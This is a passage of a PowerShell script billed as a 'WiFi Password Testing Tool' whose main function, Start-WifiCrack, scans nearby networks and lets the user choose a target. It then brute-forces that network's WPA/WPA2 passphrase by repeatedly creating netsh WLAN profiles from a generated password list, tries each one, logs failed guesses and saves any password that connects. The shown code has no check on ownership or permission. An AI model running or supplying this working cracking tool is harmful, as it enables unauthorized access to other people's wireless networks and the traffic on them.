            "WPA-Personal" = "WPAPSK"
            "WPA2PSK" = "WPA2PSK"
            "WPAPSK" = "WPAPSK"
        }

        $actualSecurity = if ($securityMapping.ContainsKey($Security)) {
            $securityMapping[$Security]
        } else {
            $Security
        }

        # Generate profile XML
        $profileXML = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$uniqueProfileName</name>
    <SSIDConfig>
        <SSID>
            <hex>$([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($SSID)).Replace("-",""))</hex>
            <name>$SSID</name>
        </SSID>
        <nonBroadcast>false</nonBroadcast>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <autoSwitch>false</autoSwitch>
    <MSM>
        <security>
            <authEncryption>
                <authentication>$actualSecurity</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$Password</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@

        [System.IO.File]::WriteAllText($profilePath, $profileXML)

        # Add and connect profile
        $null = netsh wlan add profile filename="$profilePath" interface="$Interface" user=current
        $null = netsh wlan connect name="$uniqueProfileName" interface="$Interface"
        
        # Quick initial check
        Start-Sleep -Milliseconds 100
        $maxAttempts = 1
        $attempt = 0
        $connected = $false

        while ($attempt -lt $maxAttempts -and -not $connected) {
            $connected = Test-AdapterConnection -Interface $Interface -InterfaceGUID $InterfaceGUID -ExpectedSSID $SSID -LogFile $LogFile -DebugFile $DebugFile
            
            if (-not $connected -and $attempt -lt ($maxAttempts - 1)) {
                Start-Sleep -Milliseconds 100
            }
            $attempt++
        }

        return $connected
    }
    catch {
        Write-Log "Connection test error: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
    finally {
        # Cleanup
        if ($profilePath -and (Test-Path $profilePath)) {
            Remove-Item -Path $profilePath -Force
        }
        
        if ($uniqueProfileName) {
            netsh wlan delete profile name="$uniqueProfileName" interface="$Interface" | Out-Null
        }
    }
}

function Test-AdapterConnection {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Interface,
        [Parameter(Mandatory=$true)]
        [string]$InterfaceGUID,
        [Parameter(Mandatory=$true)]
        [string]$ExpectedSSID,
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        # Quick interface check
        $interfaceDetails = netsh wlan show interfaces name="$Interface" | Out-String
        
        # Basic checks first
        if (-not ($interfaceDetails -match "Name\s+:\s+$([regex]::Escape($Interface))")) {
            return $false
        }

        if (-not ($interfaceDetails -match "State\s+:\s+connected|Status\s+:\s+Verbunden")) {
            return $false
        }

        if (-not ($interfaceDetails -match "SSID\s+:\s+$([regex]::Escape($ExpectedSSID))")) {
            return $false
        }

        # Verify adapter status
        $adapterStatus = Get-NetAdapter | Where-Object InterfaceGuid -eq $InterfaceGUID
        if ($adapterStatus.Status -ne "Up") {
            return $false
        }

        # Signal strength check
        if ($interfaceDetails -match "Signal\s+:\s+(\d+)%") {
            $signal = [int]($Matches[1])
            if ($signal -lt 1) {
                return $false
            }
        }
        else {
            return $false
        }

        Write-Log "Connection verified for $Interface to $ExpectedSSID" "DEBUG" $LogFile $DebugFile
        return $true
    }
    catch {
        Write-Log "Connection verification error: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
}

function Start-WifiCrack {
    try {
        # Get default log paths for initial operations
        $defaultLogs = Get-LogPaths
        
        # Verify admin rights
        if (-not (Test-AdminRights)) {
            Write-Host "Administrator rights required!" -ForegroundColor Red
            Write-Host "Please run the script as Administrator" -ForegroundColor Yellow
            Write-Log "Administrator rights check failed" "ERROR" $defaultLogs.LogFile $defaultLogs.DebugFile
            return
        }

        # Initialize system settings and display header
        Clear-Host
        Write-Host "WiFi Password Testing Tool v3.6" -ForegroundColor Cyan
        Write-Host "=============================" -ForegroundColor Cyan

        # Initialize system optimizations
        if (-not (Initialize-SystemSettings -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile)) {
            Write-Host "Failed to initialize system settings. Continuing with default settings..." -ForegroundColor Yellow
        }

        # Select network adapter
        $selectedAdapter = Select-NetworkAdapter
        if (-not $selectedAdapter) {
            Write-Host "No adapter selected. Exiting..." -ForegroundColor Red
            Write-Log "No adapter selected" "ERROR" $defaultLogs.LogFile $defaultLogs.DebugFile
            return
        }
        $CONFIG.Interface = $selectedAdapter.Name
        $CONFIG.InterfaceGUID = $selectedAdapter.GUID

        Write-Host "`nUsing adapter: $($selectedAdapter.Name)" -ForegroundColor Cyan
        Write-Host "Adapter GUID: $($selectedAdapter.GUID)" -ForegroundColor Cyan

        # Verify adapter functionality and capabilities
        if (-not (Test-WifiCapabilities -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile -AdapterInfo $selectedAdapter)) {
            Write-Host "Selected adapter not suitable for testing. Please check adapter capabilities." -ForegroundColor Red
            return
        }

        if (-not (Test-WifiInterface -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile)) {
            Write-Host "Selected adapter not ready. Please check connection." -ForegroundColor Red
            Write-Host "Troubleshooting steps:" -ForegroundColor Yellow
            Write-Host "1. Verify adapter is properly connected" -ForegroundColor Yellow
            Write-Host "2. Check Device Manager for driver status" -ForegroundColor Yellow
            Write-Host "3. Try disconnecting and reconnecting the adapter" -ForegroundColor Yellow
            return
        }

        # Initialize scanning
        Write-Host "`nScanning for networks..." -ForegroundColor Yellow
        $networks = Get-WifiNetworks -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile

        if ($null -eq $networks -or $networks.Count -eq 0) {
            Write-Host "No networks found in range" -ForegroundColor Red
            Write-Host "Please ensure:" -ForegroundColor Yellow
            Write-Host "1. Target network is broadcasting SSID" -ForegroundColor Yellow
            Write-Host "2. Adapter has sufficient signal strength" -ForegroundColor Yellow
            return
        }

        # Display available networks
        Write-Host "`nAvailable Networks:" -ForegroundColor Cyan
        Write-Host "==================" -ForegroundColor Cyan
        for ($i = 0; $i -lt $networks.Count; $i++) {
            $security = Get-NetworkSecurityType -SSID $networks[$i].SSID -AdapterInfo $selectedAdapter
            Write-Host ("`n[{0}] {1}" -f $i, $networks[$i].SSID) -ForegroundColor Green
            Write-Host ("    Signal: {0}% | Security: {1}" -f $networks[$i].Signal, $security) -ForegroundColor Gray
        }

        # Network selection with validation
        do {
            try {
                $selection = Read-Host "`nSelect network number (0-$($networks.Count - 1))"
                $selection = [int]$selection
                if ($selection -ge 0 -and $selection -lt $networks.Count) { break }
                Write-Host "Invalid selection. Please try again." -ForegroundColor Red
            }
            catch {
                Write-Host "Invalid input. Please enter a number." -ForegroundColor Red
            }
        } while ($true)

        $targetNetwork = $networks[$selection]
        $security = Get-NetworkSecurityType -SSID $targetNetwork.SSID -AdapterInfo $selectedAdapter

        # Display target information
        Write-Host "`nTarget Network Details:" -ForegroundColor Cyan
        Write-Host "=====================" -ForegroundColor Cyan
        Write-Host "SSID: $($targetNetwork.SSID)" -ForegroundColor Yellow
        Write-Host "Security: $security" -ForegroundColor Yellow
        Write-Host "Signal Strength: $($targetNetwork.Signal)%" -ForegroundColor Yellow
        Write-Host "Interface: $($CONFIG.Interface)" -ForegroundColor Yellow

        # Initialize network directory and logging
        $paths = Initialize-NetworkDirectory -SSID $targetNetwork.SSID
        Write-Log "Starting password test for $($targetNetwork.SSID)" "INFO" $paths.LogFile $paths.DebugFile
        Write-Log "Security type: $security" "INFO" $paths.LogFile $paths.DebugFile

        # Initialize connection manager and wrong passwords set
        $connectionManager = [ConnectionStateManager]::new($CONFIG.Interface, $CONFIG.InterfaceGUID, $paths.LogFile, $paths.DebugFile)
        $wrongPasswords = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
        
        # Load previously tested passwords
        if (Test-Path $paths.WrongPasswordsFile) {
            Get-Content $paths.WrongPasswordsFile | ForEach-Object { [void]$wrongPasswords.Add($_) }
            Write-Log "Loaded $($wrongPasswords.Count) previously tested passwords" "INFO" $paths.LogFile $paths.DebugFile
        }

        # Generate and prepare passwords
        Write-Host "`nGenerating password list..." -ForegroundColor Yellow
        $passwords = Generate-PasswordList -SSID $targetNetwork.SSID -LogFile $paths.LogFile -DebugFile $paths.DebugFile -WrongPasswords $wrongPasswords
        
        if ($passwords.Count -eq 0) {
            Write-Host "No valid passwords generated for testing" -ForegroundColor Red
            return
        }

        $total = $passwords.Count
        Write-Host "`nStarting password test..." -ForegroundColor Cyan
        Write-Host "Total passwords to test: $total" -ForegroundColor Cyan
        Write-Host "Press 'Q' to stop`n" -ForegroundColor Yellow

        # Prepare for testing
        $connectionManager.PrepareForTesting()
        $progressTracker = [ProgressTracker]::new($total, $paths.LogFile, $paths.DebugFile)
        $connectionManager.StartTimer()

        # Main testing loop
		foreach ($password in $passwords) {
			# Check for quit command
			if ([Console]::KeyAvailable) {
				$key = [Console]::ReadKey($true)
				if ($key.Key -eq 'Q') {
					Write-Host "`nOperation stopped by user" -ForegroundColor Yellow
					Write-Log "Operation stopped by user" "WARNING" $paths.LogFile $paths.DebugFile
					break
				}
			}

			$progressTracker.UpdateProgress($password)
			
			Write-Log "Testing password: $password" "DEBUG" $paths.LogFile $paths.DebugFile
			
			$connectionParams = @{
				SSID = $targetNetwork.SSID
				Password = $password
				Security = $security
				Interface = $CONFIG.Interface
				InterfaceGUID = $CONFIG.InterfaceGUID
				LogFile = $paths.LogFile
				DebugFile = $paths.DebugFile
			}

			Write-Log "Attempting connection with parameters: $($connectionParams | ConvertTo-Json)" "DEBUG" $paths.LogFile $paths.DebugFile
			
			$connectionResult = Test-WifiConnection @connectionParams
			
			Write-Log "Connection result: $connectionResult" "DEBUG" $paths.LogFile $paths.DebugFile

			if ($connectionResult) {
				$timeSpent = $connectionManager.GetElapsedTime()
				$stats = $progressTracker.GetStatistics()

				# Success output
				Write-Progress -Activity "Testing Passwords" -Completed
				Write-Host "`nPassword Found!" -ForegroundColor Green
				Write-Host "===============" -ForegroundColor Green
				Write-Host "SSID: $($targetNetwork.SSID)" -ForegroundColor Green
				Write-Host "Password: $password" -ForegroundColor Green
				Write-Host "Security: $security" -ForegroundColor Green
				Write-Host "Time Taken: $($timeSpent.ToString('mm\:ss'))" -ForegroundColor Green
				Write-Host "Passwords Tested: $($stats.TestedPasswords)" -ForegroundColor Green
				Write-Host "Average Speed: $([math]::Round($stats.AverageSpeed, 1)) passwords/second" -ForegroundColor Green

				# Log success
				Write-Log "Password found: $password" "SUCCESS" $paths.LogFile $paths.DebugFile

				# Save detailed result
				$resultInfo = @"
SSID: $($targetNetwork.SSID)
Password: $password
Security Type: $security
Interface: $($CONFIG.Interface)
Time Taken: $($timeSpent.ToString('mm\:ss'))
Passwords Tested: $($stats.TestedPasswords)
Average Speed: $([math]::Round($stats.AverageSpeed, 1)) passwords/second
Date: $(Get-Date)
Signal Strength: $($targetNetwork.Signal)%
"@
				$resultInfo | Out-File -FilePath $paths.SuccessFile -Encoding UTF8
				return
			}
			else {
				# Log failed attempt and add to wrong passwords file
				[void]$wrongPasswords.Add($password)
				Add-Content -Path $paths.WrongPasswordsFile -Value $password
			}
		}

        # Complete progress bar
        Write-Progress -Activity "Testing Passwords" -Completed

        # No password found
        $timeSpent = $connectionManager.GetElapsedTime()
        $stats = $progressTracker.GetStatistics()
        Write-Host "`nPassword Not Found" -ForegroundColor Red
        Write-Host "=================" -ForegroundColor Red
        Write-Host "Time Spent: $($timeSpent.ToString('mm\:ss'))" -ForegroundColor Yellow
        Write-Host "Passwords Tested: $($stats.TestedPasswords)" -ForegroundColor Yellow
        Write-Host "Average Speed: $([math]::Round($stats.AverageSpeed, 1)) passwords/second" -ForegroundColor Yellow
        Write-Log "Password test completed without success" "INFO" $paths.LogFile $paths.DebugFile
    }
    catch {
        Write-Host "`nCritical error occurred:" -ForegroundColor Red
        Write-Host $_.Exception.Message -ForegroundColor Red
        Write-Host "`nStack Trace:" -ForegroundColor Red
        Write-Host $_.ScriptStackTrace -ForegroundColor Red
        Write-Log "Critical error: $_" "ERROR" $paths.LogFile $paths.DebugFile
    }
    finally {
        # Cleanup and reset
        if ($connectionManager) {
            $connectionManager.CleanupConnection()
        }
    }
}

# Script Entry Point
try {
    # Set process priority
    $process = Get-Process -Id $PID
    $process.PriorityClass = 'Realtime'

    # Start main function
    Start-WifiCrack
}
catch {
    Write-Host "`nCritical error: $_" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Red
}
finally {
    # Cleanup and reset
    Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
